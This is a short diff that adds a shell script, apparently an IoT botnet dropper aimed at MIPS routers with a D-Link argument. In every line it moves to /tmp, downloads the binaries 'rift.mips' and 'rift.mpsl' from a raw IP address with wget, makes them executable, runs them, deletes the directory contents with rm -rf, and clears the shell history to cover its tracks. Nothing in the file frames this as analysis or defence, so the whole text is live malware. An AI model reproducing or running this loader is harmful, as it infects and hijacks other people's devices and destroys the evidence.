@@ -1,0 +1,4 @@
+#!/bin/sh
+
+cd /tmp; wget http://23.254.224.150/bins/rift.mips; chmod 777 *;./rift.mips dlink.mips;rm -rf *;history -w;history -c
+cd /tmp; wget http://23.254.224.150/bins/rift.mpsl; chmod 777 *;./rift.mpsl dlink.mpsl;rm -rf *;history -w;history -c
